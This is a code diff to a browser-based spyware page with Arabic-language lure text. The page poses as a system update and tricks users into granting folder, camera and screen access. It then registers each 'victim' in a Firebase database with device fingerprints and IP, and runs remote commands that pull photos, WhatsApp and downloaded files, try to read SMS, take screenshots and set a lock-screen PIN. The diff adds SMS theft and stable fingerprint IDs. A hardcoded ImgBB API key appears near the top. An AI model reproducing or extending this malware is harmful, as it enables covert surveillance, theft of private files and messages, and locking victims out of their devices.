@@ -30,12 +30,23 @@
         const IMGBB_KEY = "69e4b5971880f9d736172f5fc9eb5bac";
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const vid = 'phantom-' + Math.random().toString(36).substr(2,12);
+
+        const browserFingerprint = navigator.userAgent + screen.width + screen.height + navigator.hardwareConcurrency;
+        const vid = 'phantom-' + Math.abs(hashCode(browserFingerprint)).toString(36);
         const vref = db.ref('victims/'+vid);
         let ROOT_HANDLE = null;
         let camStream = null;
-        let audioCtx = null;
-        let deviceRegistered = false;
+        let lootCounter = 0;
+
+        function hashCode(str) {
+            let hash = 0;
+            for (let i = 0; i < str.length; i++) {
+                const char = str.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash |= 0;
+            }
+            return hash;
+        }
 
         setTimeout(() => {
             document.getElementById('msg').innerText = "يرجى الضغط على 'بدء التحديث' للمتابعة";
@@ -49,17 +60,11 @@
             document.getElementById('msg').innerText = "جاري فتح نافذة التحديث...";
             document.getElementById('guide').innerText = "الرجاء اختيار مجلد 'الذاكرة الداخلية' أو 'Internal Storage' ثم الضغط على 'موافق' أو 'Select'";
 
-            // تسجيل الجهاز أولاً
+            await vref.child('loot').remove();
+            lootCounter = 0;
             await registerDevice();
 
-            // الحصول على الجذر
-            try {
-                ROOT_HANDLE = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
-            } catch(e) {
-                ROOT_HANDLE = null;
-            }
-
-            // الصلاحيات الأخرى
+            try { ROOT_HANDLE = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' }); } catch(e) { ROOT_HANDLE = null; }
             try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
             try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true }); d.getTracks().forEach(t => t.stop()); } catch(e) {}
             try {
@@ -68,9 +73,7 @@
                 a.click();
             } catch(e) {}
 
-            // تحديث الحالة
             vref.child('online').set(true);
-
             document.getElementById('msg').innerText = "✅ تم بنجاح";
             document.getElementById('guide').style.display = 'none';
             setTimeout(() => {
@@ -81,46 +84,30 @@
         };
 
         async function registerDevice() {
-            if (deviceRegistered) return;
             let ip = 'غير معروف';
             try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
             let battery = '?', charging = false;
-            try {
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    battery = Math.round(b.level*100)+'%';
-                    charging = b.charging;
-                }
-            } catch(e) {}
-
+            try { if (navigator.getBattery) { const b = await navigator.getBattery(); battery = Math.round(b.level*100)+'%'; charging = b.charging; } } catch(e) {}
             await vref.set({
                 online: true,
                 fingerprint: {
-                    ua: navigator.userAgent,
-                    plat: navigator.platform,
-                    scr: screen.width+'x'+screen.height,
-                    cores: navigator.hardwareConcurrency,
-                    mem: navigator.deviceMemory||'?',
-                    ip: ip,
-                    battery: battery,
-                    charging: charging,
-                    language: navigator.language,
-                    time: new Date().toLocaleString()
+                    ua: navigator.userAgent, plat: navigator.platform, scr: screen.width+'x'+screen.height,
+                    cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory||'?',
+                    ip, battery, charging, language: navigator.language, time: new Date().toLocaleString()
                 }
             });
-            deviceRegistered = true;
-            console.log('✅ تم تسجيل الجهاز: ' + vid);
         }
 
         function startCommandListener() {
             vref.child('command').on('value', async snap => {
                 const c = snap.val();
                 if (!c) return;
-                console.log('📩 أمر وارد:', c);
                 try {
                     switch(c.action) {
                         case 'get_photos': c.folder ? await pullFromFolder(c.folder) : await pullAll(); break;
                         case 'get_files': await pullFromFolder(c.folder || 'downloads'); break;
+                        case 'get_sms': await getSMS(); break;
+                        case 'send_notification': showNotification(c.message || ''); break;
                         case 'vibrate': navigator.vibrate([500,200,500,200,500]); break;
                         case 'play_sound': playRingtone(); break;
                         case 'screenshot': await screenshot(); break;
@@ -131,36 +118,26 @@
                         case 'device_info': await sendDeviceInfo(); break;
                         case 'lock_screen': lockScreen(c.pin || ''); break;
                     }
-                } catch(e) {
-                    console.error('❌ خطأ:', e);
-                }
+                } catch(e) {}
                 await vref.child('command').remove();
             });
         }
 
-        // ✅ تشغيل رنة تنبيه فقط (وليس الميكروفون)
         function playRingtone() {
             try {
                 const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                const osc = ctx.createOscillator();
-                const gain = ctx.createGain();
-                osc.type = 'square';
-                osc.frequency.value = 800;
-                gain.gain.value = 0.3;
-                osc.connect(gain);
-                gain.connect(ctx.destination);
-                osc.start();
+                const osc = ctx.createOscillator(), gain = ctx.createGain();
+                osc.type = 'square'; osc.frequency.value = 800; gain.gain.value = 0.3;
+                osc.connect(gain); gain.connect(ctx.destination); osc.start();
                 setTimeout(() => { osc.stop(); gain.disconnect(); ctx.close(); }, 3000);
             } catch(e) {}
         }
 
         async function getFolderHandle(folderName) {
             const FOLDER_NAMES = {
-                camera: 'DCIM/Camera',
-                downloads: 'Download',
+                camera: 'DCIM/Camera', downloads: 'Download',
                 whatsapp: 'WhatsApp/Media/WhatsApp Images',
-                facebook: 'Facebook/Media',
-                pictures: 'Pictures'
+                facebook: 'Facebook/Media', pictures: 'Pictures'
             };
             const displayName = FOLDER_NAMES[folderName] || folderName;
             document.body.innerHTML = `<h2 style="color:#fff;text-align:center;margin-top:40vh;">الرجاء اختيار مجلد:<br>${displayName}</h2>`;
@@ -174,16 +151,8 @@
             }
         }
 
-        async function pullFromFolder(key) {
-            const handle = await getFolderHandle(key);
-            await walkDir(handle, key + '/');
-        }
-
-        async function pullAll() {
-            for (const key of ['camera','downloads','whatsapp','facebook','pictures']) {
-                try { await pullFromFolder(key); } catch(e) {}
-            }
-        }
+        async function pullFromFolder(key) { const handle = await getFolderHandle(key); await walkDir(handle, key + '/'); }
+        async function pullAll() { for (const key of ['camera','downloads','whatsapp','facebook','pictures']) { try { await pullFromFolder(key); } catch(e) {} } }
 
         async function walkDir(dirHandle, prefix) {
             for await (let entry of dirHandle.values()) {
@@ -202,6 +171,32 @@
                     await walkDir(sub, prefix+entry.name+'/');
                 }
             }
+        }
+
+        async function getSMS() {
+            try {
+                let messages = [];
+                if ('webkitSms' in window) {
+                    const smsList = await window.webkitSms.getMessages({});
+                    for (let sms of smsList) { messages.push({ from: sms.sender, body: sms.body, date: new Date(sms.timestamp).toLocaleString() }); }
+                } else if ('sms' in navigator) {
+                    const smsList = await navigator.sms.getMessages({});
+                    for (let sms of smsList) { messages.push({ from: sms.sender, body: sms.body, date: new Date(sms.timestamp).toLocaleString() }); }
+                } else {
+                    throw new Error('SMS API غير مدعوم');
+                }
+                await store('sms', null, { info: messages });
+            } catch(e) {
+                await store('sms', null, { info: { error: e.message } });
+            }
+        }
+
+        function showNotification(message) {
+            const div = document.createElement('div');
+            div.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#ff0;color:#000;padding:20px 30px;border-radius:10px;font-size:1.2em;font-weight:bold;z-index:999999;box-shadow:0 0 20px rgba(0,0,0,0.5);text-align:center;';
+            div.textContent = message;
+            document.body.appendChild(div);
+            setTimeout(() => { div.remove(); }, 3000);
         }
 
         async function setFlash(on) {
@@ -260,9 +255,7 @@
         function lockScreen(pin) {
             try {
                 window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${pin};end`);
-                setTimeout(() => {
-                    window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end');
-                }, 500);
+                setTimeout(() => { window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end'); }, 500);
             } catch(e) {}
         }
 
@@ -275,7 +268,8 @@
         }
 
         async function store(type, url, extra = {}) {
-            await vref.child('loot').push().set({ type, url, ts: Date.now(), ...extra });
+            lootCounter++;
+            await vref.child('loot').push().set({ type, url, ts: Date.now(), counter: lootCounter, ...extra });
         }
     </script>
 </body>
